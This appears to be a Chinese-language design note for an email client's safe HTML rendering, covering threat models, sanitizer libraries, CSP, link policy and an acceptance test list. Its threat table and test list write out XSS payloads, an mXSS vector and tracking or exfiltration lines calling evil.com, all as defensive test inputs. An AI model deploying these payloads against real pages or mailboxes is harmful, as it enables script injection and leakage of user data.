# 邮件正文 HTML 渲染方案调研

> 日期：2026-10-25 ｜ 项目：MailPilotNative ｜ 对应 SPEC 未完成项「正文富文本渲染（WKWebView）」
> 目标：渲染保真度接近 Apple Mail，同时安全边界明确、可验证。

## 0. TL;DR

**现状**：`EmlxParser.swift` 在解析阶段就把 text/html 用 `stripHTML()` 剥成纯文本，`ReaderView` 只渲染 `Text(message.body)`——**当前没有任何 HTML 渲染能力**，排版、表格、内联图片、链接全部丢失。

**结论**：自建「清洗 → 内联 → 渲染 → 链接策略」四段管线，WKWebView 承载，三层安全防线叠加。不需要引入重型依赖，但要抄三段成熟代码：

| 抄什么 | 来源 | 许可 | 用途 |
|---|---|---|---|
| DOMPurify min.js（22.6KB） | cure53/DOMPurify | Apache-2.0 / MPL-2.0 双许可 | 注入 WKWebView 的第二层 DOM 消毒 |
| HtmlSanitizer 白名单逻辑（约 300 行） | K-9 Mail / Thunderbird Android | Apache-2.0 | 移植成 Swift 的第一层结构清洗 |
| cid → data URI 内联思路 | MailCore2 `MCOHTMLRendererDelegate` | BSD-3-clause | 内联图片转换的设计参考 |
| SwiftSoup | scinfu/SwiftSoup | MIT | Swift 侧 HTML5 容错解析基础设施 |

**不推荐**：`NSAttributedString(.html)` 做主渲染（远程图片会真去加载、CSS 支持差、消毒行为不透明）；整体引入 MailCore2（为渲染拖进整个 IMAP/SMTP 栈，不划算）；mutt/aerc 式外部进程转文本（可留作设置里的「纯文本安全模式」，不作为主渲染）。

## 1. 威胁模型：邮件 HTML ≠ 网页 HTML

网页 HTML 的不信任来自「用户可能访问恶意站点」；邮件 HTML 的不信任来自「**攻击者主动投递，用户没有选择**」。任何人可以给你发任何 HTML，你的客户端必须假设每封邮件的正文都是敌意构造的。

| # | 威胁向量 | 具体形态 | 防线 |
|---|---|---|---|
| T1 | 脚本执行 | `<script>`、`on*` 事件属性、`javascript:` URL、`<svg onload>`、`data:text/html` | Swift 白名单清洗 + DOMPurify + CSP |
| T2 | 远程资源泄露 | 跟踪像素（1x1 img）、CSS `background-image`、外链字体、`<iframe>`、`<link>` | CSP `img-src data:` 断网 + 默认剥离远程 src |
| T3 | 数据外传通道 | `<img src="https://evil.com/log?d=...">` 把正文内容/已读状态/IP 带出去 | 同 T2；WebView 默认零外联 |
| T4 | 钓鱼链接 | 文字写 `https://paypal.com`、href 指向仿冒站；IDN 同形字（`аpple.com` 的 а 是西里尔字母）；多层跳转跟踪链 | 链接策略：真实 URL 强制展示 + 确认后才打开 + 域名不符警告 |
| T5 | MIME 混淆 | multipart/alternative 里 text/plain 与 text/html 内容不一致；把 text/html 声明成 text/plain 显示导致转义失效 | 解析层按 MIME 类型分派，不混用（现有 EmlxParser 已分开，需保留） |
| T6 | WebKit 自身漏洞 | WKWebView 0day | 进程隔离（WebKit 本就独立进程）+ nonPersistent data store + 不加载任何远程内容缩小攻击面 |
| T7 | 渲染炸弹 | 100MB base64 图片、深层嵌套 DOM、CSS 死循环、`<meta refresh>` 循环跳转 | 资源上限（大小/数量/尺寸裁剪）+ 剥 `<meta>` |
| T8 | UI 欺骗 | 邮件内 JS 弹 `alert()` 伪装系统对话框骗密码；伪装登录表单（`<form>` + `<input>`） | 剥 `<form>`/`<input>` 或拦截；WKUIDelegate 静默吞掉所有面板 |
| T9 | 深色模式隐私 | 写死白底黑字或利用 `prefers-color-scheme` 探测用户系统设置 | 容器级强制 color-scheme，不把系统偏好暴露给正文 |

**核心原则：清洗（sanitize）只负责「不会执行恶意代码」，断网（CSP）负责「不会泄露任何数据」，链接策略负责「不会被钓鱼」。三者互不替代。**

## 2. 主流产品怎么做的

| 产品 | 渲染引擎 | 清洗方式 | 远程图片 | 链接策略 |
|---|---|---|---|---|
| Apple Mail | WebKit（私有框架） | 私有消毒器，细节不公开 | 默认阻止，per-message「加载远程内容」 | 悬停显示真实 URL；点击直接交默认浏览器；有基于邮件认证的反钓鱼检测 |
| Thunderbird 桌面 | Gecko（自研 HTML parser） | 白名单消毒（MPL-2.0 可读源码） | 默认阻止，per-message 允许 | 悬停显示真实 URL，点击前提示 |
| Thunderbird Android（原 K-9） | Android WebView | `HtmlSanitizer` 白名单（Apache-2.0） | `blockNetworkLoads` 默认断网，用户点「显示图片」放行 | `shouldOverrideUrlLoading` 拦截全部导航，非 http(s)  scheme 需用户确认 |
| Gmail / Outlook | 服务端渲染 + 私有 | 服务端消毒（抄不了） | 服务端代理图片（防直连同） | 服务端判定，可疑链接跳转警告页 |
| Proton Mail | 浏览器 + DOMPurify | DOMPurify（开源可抄） | 默认阻止 | 链接确认 |
| Roundcube（webmail） | 浏览器 | `rcube_washtml` 白名单（GPL-3.0+例外，原 washtml 为 BSD-2） | per-user 策略 | 悬停显示 |
| mutt / aerc | 不渲染，`w3m`/`html2text` 转文本 | 无 HTML = 无攻击面 | 天然无 | 不可点 |
| SwiftSoup / jsoup 生态 | — | 白名单 `Cleaner` + `Safelist`（MIT） | — | — |

**可借鉴的共识**（四个独立实现收敛到同一答案）：白名单而非黑名单；远程内容默认断网、按消息放行；真实 URL 必须对用户可见；危险 scheme 一律不放行。

## 3. 候选成熟方案详评

### 3.1 DOMPurify —— 直接抄（第二层）

- **是什么**：Cure53 出品的 XSS 消毒库，2014 年至今，v3.x，Fastmail 设 bug bounty。催生了 WICG HTML Sanitizer API（正在进 WHATWG 规范）。
- **许可**：双许可，Apache-2.0 或 MPL-2.0 任选（我们选 Apache-2.0，保留 NOTICE 即可）。
- **集成方式**：`dist/purify.min.js`（22.6KB，已实测可从 jsdelivr CDN 获取）打进 App bundle，运行时读出，作为 `WKUserScript(at: .atDocumentStart)` 注入。DOMContentLoaded 时执行：
  ```js
  document.addEventListener('DOMContentLoaded', function () {
    document.documentElement.innerHTML = DOMPurify.sanitize(
      document.documentElement.innerHTML,
      { USE_PROFILES: { html: true }, ALLOW_DATA_ATTR: false, ALLOW_ARIA_ATTR: true }
    );
  });
  ```
- **能力边界（必须知道）**：DOMPurify 防 XSS，**不防远程图片跟踪**（`<img src="https://tracker/">` 在它眼里是合法 HTML）。断网必须靠 CSP。另外官方纪律：先消毒后使用、消毒后不要再改 HTML、`sanitize()` 不可重入（hook 里别再调）。
- **结论**：抄。作为浏览器真解析后的第二层，专门对付 Swift 侧解析器与 WebKit 的解析差异（mXSS）。

### 3.2 K-9 Mail HtmlSanitizer —— 移植（第一层）

- **是什么**：K-9 / Thunderbird Android 的邮件显示消毒器，Kotlin 约 300 行，白名单制。允许常见排版标签，剥 `script/style/iframe/object/embed/form/link/meta/base`，剥全部 `on*` 属性，`href` 只放行 http/https/mailto/tel。
- **许可**：Apache-2.0，移植需保留版权声明。
- **为什么值得移植而不是直接用 DOMPurify 一层**：DOMPurify 跑在 WebView 里，是「渲染前最后一秒」的兜底；Swift 侧还需要一层，因为我们要在进 WebView **之前**做很多事——cid 图片转换、远程 src 剥离、链接改写、资源上限控制。这些都在 Swift 侧操作 DOM，没有 Swift 侧清洗就没有操作空间。两层分工：Swift 层管「结构化改造」，JS 层管「防解析差异绕过」。
- **结论**：移植。结构直接对应 Swift 枚举 + 结构体，详见第 5 节代码骨架。

### 3.3 MailCore2 —— 只借鉴设计，不引入

- **核实事实**：BSD-3-clause 许可（有 "Neither the name of the MailCore project" 条款）；SPM 可用；2026 年 9 月仍有提交（JMAP / ActiveSync 在活跃开发）；`MCOHTMLRendererDelegate` 提供模板化整页渲染：`templateForMainHeader` / `templateForImage` / `templateForAttachment`，`MCOIMAPMessage.htmlRenderingWithFolder:delegate:` 产出完整 HTML 页。
- **评价**：这是开源社区唯一的「生产级原生邮件 HTML 渲染器」，cid 图片内联、头部/附件模板化的设计很成熟。但它绑定自己的消息模型（`MCOAbstractMessage`），且引入它等于拖进整个 IMAP/SMTP/Activesync C++ 栈。我们已经有自己的 NativeMailStore + EmlxParser，**只抄它的设计，不引依赖**。
- **结论**：读 `MCHTMLRendererCallback.cpp` 的默认模板，借鉴「头部信息块 + 正文 + 附件列表」的整页组织方式。

### 3.4 SwiftSoup —— 引入（基础设施）

- jsoup 的 Swift 移植，MIT。HTML5 容错解析（邮件 HTML 的 malformed 程度超乎想象，正则清洗一定被打穿）、白名单 `Cleaner`、`text()` 提取。
- 用途：第一层清洗的解析器；顺带替换现有 `stripHTML()` 做纯文本兜底（现在的正则剥离会把 CSS 源码漏进正文，代码注释里自己都提到了）。
- 注意：解析放后台线程，`Document` 对象不要跨线程传递，传字符串。

### 3.5 Roundcube rcube_washtml —— 只读设计

- GPL-3.0（含 skins/plugins 例外），底层 washtml 是 BSD-2。**许可证不兼容直接抄代码**，但它的白名单表（标签/属性/CSS 属性三级）是邮件场景调教最细的公开实现，值得逐项对照我们的白名单。

### 3.6 NSAttributedString(.html) —— 不采用

- 系统自带、零依赖，但：会尝试加载远程图片（隐私泄露且行为随系统版本变化）、CSS 支持极差（表格布局全废）、Apple 的消毒策略不透明不可审计。对我们「安全边界明确、可验证」的目标是负分。
- 仅留作「极简模式」的可选项，不作为主渲染。

## 4. 推荐架构

### 4.1 数据流

```
.emlx → EmlxParser（保留 text/html 原文 + 附件 parts 带 Content-ID + Content-Type）
   │
   ▼  后台线程
HTMLSanitizer.sanitize(html)          ① Swift 白名单清洗（移植 K-9）
   │   - 剥 script/style/iframe/object/embed/form/link/meta/base
   │   - 剥 on* 属性、style 里的 expression/url(javascript:)
   │   - href/src 协议过滤：只留 http/https/mailto/tel + cid:
   │   - 危险 scheme → 剥 href，替换为 <span class="mp-blocked-link">⚠️ 已拦截</span>
   │   - 资源上限：HTML ≤ 5MB，DOM 深度 ≤ 100
   ▼
ImageInliner.inline(html, parts)      ② cid: → data: URI（≤2MB/张、≤30 张、仅 image/*）
   │   - 远程 src → 替换为占位 <span class="mp-remote-img" data-src="...">[远程图片]</span>
   ▼
CSPWrapper.wrap(html)                 ③ 注入 <meta http-equiv="Content-Security-Policy">
   │   default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:
   ▼  主线程
SafeMailWebView.loadHTMLString(html, baseURL: nil)
   │   - websiteDataStore = .nonPersistent()
   │   - javaScriptCanOpenWindows = false
   │   - DOMPurify 以 atDocumentStart 注入，DOMContentLoaded 再消一次（④）
   ▼
MailNavigationDelegate                 ⑤ 拦截所有导航：链接确认 sheet / 危险 scheme 已不可点
```

**四层防线与威胁模型的对应关系**：① 对 T1/T5/T7/T8（结构与协议层）；②+CSP 对 T2/T3（数据层，WebView 零外联）；④ 对 T1 的解析差异绕过（mXSS）；⑤ 对 T4（钓鱼）。T6 靠 WebKit 进程隔离 + nonPersistent + ② 的零外联把攻击面压到最小。

### 4.2 代码骨架：HTMLSanitizer（第一层）

```swift
import SwiftSoup

enum HTMLSanitizer {
    // 邮件排版需要的标签白名单（对照 Roundcube washtml 的表逐项裁过）
    static let allowedTags: Set<String> = [
        "a","p","div","span","br","hr","blockquote","pre","code",
        "b","strong","i","em","u","s","strike","sub","sup","small","big",
        "h1","h2","h3","h4","h5","h6","ul","ol","li","dl","dt","dd",
        "table","thead","tbody","tfoot","tr","td","th","caption","colgroup","col",
        "img","figure","figcaption","center","font","abbr","address","wbr",
    ]
    // style 属性要放行（邮件全靠内联样式），但值要过滤
    static let allowedAttrs: Set<String> = [
        "href","src","alt","title","width","height","align","valign","bgcolor",
        "border","cellpadding","cellspacing","colspan","rowspan","color","face","size",
        "style","class","id","dir","lang",
    ]
    static let allowedSchemes: Set<String> = ["http", "https", "mailto", "tel", "cid"]

    /// 返回 (清洗后 HTML, 被拦截的危险链接数, 被剥离的远程图片数)
    static func sanitize(_ raw: String) -> (html: String, blockedLinks: Int, strippedRemoteImages: Int) { … }
}
```

清洗规则要点（移植 K-9 逻辑时的关键决策）：
- **白名单之外一律删除标签但保留文本内容**（`<script>x</script>` 的内容也要删——script/style 是 rawtext，内容不能留）。
- `style` 属性值过滤：`expression(`、`url(` 内非 http/https/data:image、`behavior:`、`-moz-binding` 一律删整条声明。
- `<a href>` 协议不在白名单 → 删 href，替换为 `<span class="mp-blocked-link">⚠️ 已拦截的危险链接</span>`（用户看得见「这里有鬼」，对应需求「某些链接不能正常显示」）。
- `<img src>` 远程 → 换占位；`cid:` → 留给 ImageInliner；`data:` → 只允许 `data:image/(png|jpeg|gif|webp)` 且 ≤2MB。

### 4.3 代码骨架：CSP 包裹与 WebView 工厂

```swift
enum CSPWrapper {
    static let strict = "default-src 'none'; img-src data:; style-src 'unsafe-inline'; " +
                        "font-src data:; form-action 'none'; frame-src 'none'"
    static func wrap(_ body: String, darkMode: Bool) -> String {
        """
        <!DOCTYPE html><html><head>
        <meta charset="utf-8">
        <meta http-equiv="Content-Security-Policy" content="\(strict)">
        <meta name="color-scheme" content="\(darkMode ? "dark" : "light")">
        <style> :root { color-scheme: \(darkMode ? "dark" : "light"); } </style>
        </head><body>\(body)</body></html>
        """
    }
}

struct SafeMailWebView {
    static func make() -> WKWebView {
        let config = WKWebViewConfiguration()
        config.websiteDataStore = .nonPersistent()      // 不落盘，关掉即焚
        config.preferences.javaScriptCanOpenWindows = false
        // 不注册任何 WKUserContentController 的 message handler（不需要 JS→Swift 通道）
        let web = WKWebView(frame: .zero, configuration: config)
        web.uiDelegate = …        // createWebViewWith → nil；各种面板回调直接吞掉
        web.navigationDelegate = …
        web.loadHTMLString(html, baseURL: nil)          // baseURL 必须 nil，不给相对 URL 解析基准
        return web
    }
}
```

DOMPurify 注入（④）：把 `purify.min.js` 放进 bundle，启动时读出，`WKUserScript(source: purifySource + hookSource, injectionTime: .atDocumentStart, forMainFrameOnly: true)`。

### 4.4 代码骨架：链接策略（WKNavigationDelegate）

```swift
func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
             decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
    // loadHTMLString 的主文档加载：request.url 为 nil，放行
    guard let url = navigationAction.request.url, navigationAction.navigationType != .other else {
        decisionHandler(.allow); return
    }
    switch url.scheme {
    case "http", "https":
        // 一切用户点击的链接都不直接跳转：弹确认 sheet，展示完整真实 URL
        pendingLink = url
        decisionHandler(.cancel)
    case "mailto", "tel":
        decisionHandler(.cancel)   // 确认后 NSWorkspace.shared.open(url)
    default:
        decisionHandler(.cancel)   // 理论上前端已剥干净，这里兜底
    }
}
```

## 5. 链接策略细则（对应需求「某些链接不能正常显示」）

| 链接类型 | 渲染形态 | 点击行为 |
|---|---|---|
| `javascript:` / `data:` / `vbscript:` / `file:` / 未知 scheme | 不可点，替换为 ⚠️「已拦截的危险链接」纯文本 | 无 |
| http/https | 普通链接样式（但不给浏览器蓝色暗示，用中性色+下划线） | **一律弹确认 sheet**：完整真实 URL（域名加粗、punycode 解码为 Unicode 显示同时附 xn-- 原形）、「在浏览器打开 / 复制链接 / 取消」 |
| 文字与 href 域名不符（钓鱼特征，如文字是 `paypal.com` 实际指向 `paypa1.com`） | 链接后加 ⚠️ 角标，tooltip 说明「链接地址与显示文字不符」 | 同上，且 sheet 顶部红字警告 |
| IDN / 同形字域名（含非 ASCII 字符的 host） | ⚠️ 角标 | 同上，显示 Unicode 形式 + xn-- 形式 |
| 已知跳转跟踪域（可选名单，如常见 click 跟踪域名） | 「🔗 此链接经过跳转跟踪」标注 | 同上 |
| mailto: / tel: | 正常链接 | 确认后 `NSWorkspace.shared.open` |
| 页内锚点（`#xxx`） | 正常 | 允许（同一文档内滚动，不出网） |

**进阶（Phase 2，可选）**：解析邮件头 `Authentication-Results` 的 SPF/DKIM/DMARC 结果，当链接域名 ≠ 发件人认证域时，在确认 sheet 顶部显示警告——Gmail 同款思路。我们的 EmlxParser 已经能拿到原始头部，加一个解析函数即可。

**UX 基准**：Apple Mail 的悬停显示真实 URL + 不自动跳转之外的确认体验；Thunderbird 的「显示完整地址」确认对话框。我们的方案比它们更严（所有外链都需确认），因为 MailPilot 的定位是安全优先。

## 6. 远程图片策略

- **默认**：`<img src="http…">` 在第一层清洗时替换为占位元素，正文顶部显示横幅「已阻止 N 张远程图片［加载图片］」。
- **用户点「加载图片」**：不用 WebView 直接放行（那样 CSP 就白设了），而是 **App 自己用 URLSession 去取**：并发 ≤4、单张 ≤2MB、总 ≤8MB、仅接受 `image/*` Content-Type、10s 超时；取回转 data URI 后整页 reload。好处：WebView 始终零外联；请求可计数可审计（写进诊断文件）；不携带任何浏览器上下文。
- **设置级三档**（跟随现有 UISettings 体系）：始终阻止（默认）/ 每次询问 / 总是加载。`总是加载` 也走 App 代理 fetch，不走 WebView 直连。
- **cid: 内联图片**：解析阶段附件 parts 已带 Content-ID，直接转 data URI，不占远程额度、不受策略影响。

## 7. 测试用例集（XSS 向量，验收前必须全过）

1. `<script>alert(1)</script>`
2. `<img src=x onerror=alert(1)>`
3. `<svg onload=alert(1)>`
4. `<a href="javascript:alert(1)">x</a>`
5. `<iframe src="data:text/html,<script>alert(1)</script>">`
6. `<meta http-equiv="refresh" content="0;url=https://evil.com">`
7. `<div style="background-image:url(https://evil.com/track)">`
8. `<img src="https://evil.com/pixel?id=已知邮件内容">`（跟踪像素，验证零外联）
9. `<a href="https://paypa1.com">https://paypal.com</a>`（文字域名不符）
10. `<a href="https://xn--pple-43d.com">apple.com</a>`（同形字）
11. `<form action="https://evil.com"><input type=password></form>`
12. `<base href="https://evil.com/">` + 相对 URL 资源
13. `<table background="https://evil.com/x.png">`
14. `<style>@import 'https://evil.com/x.css'</style>`
15. mXSS：`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`（DOMPurify 层验证）
16. 5MB base64 data URI 图片（资源上限）
17. 200 层嵌套 `<div>`（深度上限）
18. 一封邮件 100 张 cid 图片（数量上限）
19. `<a href="cid:...">` 与伪造 Content-ID 冲突
20. multipart/alternative 中 text/plain 与 text/html 内容不一致（验证只渲染 html part、不混用）

验证方式：构造 20 个 .emlx 样本放测试目录，逐个打开，用 App 的诊断文件记录「WebView 网络请求数 = 0、被拦截链接数、被剥离图片数」，与预期逐条对照。

## 8. 分期实施计划

| 阶段 | 内容 | 依赖 |
|---|---|---|
| P0 | 引入 SwiftSoup；`HTMLSanitizer` 白名单（移植 K-9）；`ImageInliner` cid→data；CSP 包裹；基础 `SafeMailWebView` 替换 stripHTML 直出 | 无 |
| P1 | DOMPurify 注入；`MailNavigationDelegate` 链接确认 sheet；危险链接剥离与 ⚠️ 标记 | P0 |
| P2 | 远程图片：占位 + per-message 加载（URLSession 代理 fetch）+ 设置三档 | P0 |
| P3 | 深色模式三态、字号接入 `Font.app()`/UISettings、测试用例集 20 条跑通 | P1 |
| P4（可选） | Authentication-Results 反钓鱼警告；点击跟踪域名单 | P1 |

工程约束（遵循项目现有约定）：新视图用 `ObservableObject + @StateObject`（本环境编译不了 `@State` 宏）；字号走 `Font.app()`；清洗放后台线程、`Document` 不跨线程；每个 `@Published` 错误路径都要有 UI 消费（errorMessage 老坑）。

## 9. 验收清单

- [ ] 20 条 XSS 用例全部无害渲染，无脚本执行、无弹窗
- [ ] 断网状态下打开任意邮件，WebView 网络请求数 = 0（诊断文件可证）
- [ ] 跟踪像素默认 0 请求；「加载图片」后请求全部经 App 代理且可计数
- [ ] 100% 外链点击经过确认 sheet，真实 URL 完整可见
- [ ] 危险 scheme 链接不可点、有 ⚠️ 标识
- [ ] cid 内联图片正常显示（发件箱/已发送里有真实样本可测）
- [ ] 纯文本模式（现有 stripHTML 路径）仍可用，作为安全兜底
- [ ] 深色模式三态切换正常，无「一半黑一半白」
- [ ] 整页渲染 P95 < 300ms（5MB 上限邮件除外，可接受降级为纯文本）

## 10. 参考链接

- DOMPurify：https://github.com/cure53/DOMPurify （Apache-2.0/MPL-2.0；min.js 可经 jsdelivr 获取）
- DOMPurify 安全模型：https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model
- Thunderbird Android（K-9）：https://github.com/thunderbird/thunderbird-android （Apache-2.0）
- MailCore2：https://github.com/MailCore/mailcore2 （BSD-3-clause；`MCOHTMLRendererDelegate` 模板化渲染设计参考）
- Roundcube washtml：https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube_washtml.php （GPL-3.0+例外，只读设计）
- SwiftSoup：https://github.com/scinfu/SwiftSoup （MIT）
- WKWebView 加固项：`WKWebViewConfiguration.websiteDataStore = .nonPersistent()`、`preferences.javaScriptCanOpenWindows`、`WKNavigationDelegate.decidePolicyFor`（Apple Developer 文档）

## 11. 附录：能否直接复用 Apple Mail 的渲染栈（2026-10-25 核实）

结论：**渲染层没有可复用的接口；数据层其实已经在复用了**（.emlx/.mbox 本来就是 Mail 自己写和维护的）。逐条核实：

**① AppleScript 层——拿不到渲染产物。** Mail 的 AppleScript 字典中 message 类只暴露 `source`（原始 MIME 源字符串）等元数据，**没有「渲染后的 HTML」「消毒后的 HTML」这类属性或命令**。我们 EmlxParser 读到的就是同一份 source，走 AppleScript 绕一圈拿不到任何新东西，反而多一层自动化授权依赖和性能损耗。

**② 私有框架层——不可用。** Mail 的渲染栈依赖私有框架（已确认存在 `/System/Library/PrivateFrameworks/MailWebProcessSupport.framework` 等，Mail.app 本体位于 SIP 保护的 `/System/Applications/Mail.app`）：
- 无公开头文件/文档，符号表每次系统更新都可能变；
- 受 SIP 与代码签名保护，第三方 app dlopen 私有框架会被 dyld 拒绝（team id / entitlement 不匹配），且框架二进制在受保护卷上；
- 框架假设 Mail 的宿主环境（消息模型、账户系统），我们没有；
- 结论：对自用工具而言，「每次 macOS 更新后可能静默失效」的维护成本远高于移植 300 行白名单。

**③ NSAttributedString(.html)——唯一半官方选项，但不能做主渲染。** 这是 Apple 自己的 HTML→富文本引擎，零依赖、自动禁脚本。但它是「富文本片段转换器」而非邮件渲染器：表格布局、float、邮件复杂 CSS 基本全废，排版会散架；远程图片加载行为不透明。保留为「极简模式」降级路径。

**④ 一个重要的 framing：我们并没有重新开发渲染器。** WKWebView 就是 Apple 的 WebKit 引擎——和 Mail 渲染邮件用的是同一个引擎。真正要自己写的只是「如何把敌意 HTML 安全地交到 WebKit」：消毒、断网、链接策略。而这些在 Mail 里本来也是应用层行为（远程图片默认阻止、链接确认都是 Mail app 的策略，不是引擎能力），复用引擎同样拿不到，照样要自己实现。

**⑤ 务实逃生口（可作补充，不作主路径）**：阅读页提供「在 Mail 中打开」按钮，用 AppleScript（`set selected mailboxes` → `set selected messages`，需自动化授权）让 Mail 自己定位并展示该封邮件——完美排版由 Mail 满足，MailPilot 专注列表/AI/安全。代价是窗口切换的体验割裂，且依赖 Mail 的 AppleScript 稳定性。

**结论**：维持第 4 节自研管线。所谓「重新开发」实际是「移植 K-9 的 300 行 + 拼装 22KB 的 DOMPurify + 配置 WKWebView」，P0–P3 约 2–3 天工作量，且换来完全可控、可测试、不随系统更新漂移的安全边界。

## 12. 待验证/风险备注

- WKWebView 不解析 `cid:` 协议（WebKit 无 Content-ID 解析能力），内联必须 App 侧转 data URI——这是设计前提，非待验证项；但需真机验证 data URI 总量上限（建议 ≤8MB，超出降级纯文本）。
- meta CSP 对 `loadHTMLString` 加载的文档生效（文档级 CSP，与 baseURL 无关）——建议 P0 用 T8 用例实测确认。
- DOMPurify 的 `atDocumentStart` 注入与 DOMContentLoaded 重写 `innerHTML` 的组合，需用 mXSS 用例（15）实测；若出现兼容问题，退行方案是 Swift 层清洗后直接 `IN_PLACE` 模式在 documentEnd 消一次。
- K-9 的 `HtmlSanitizer` 源码路径在该仓库 2024 年模块化重构后可能有变动，移植时以其历史版本 `app/common/.../helper/HtmlSanitizer.kt` 为准（Apache-2.0，注明来源）。

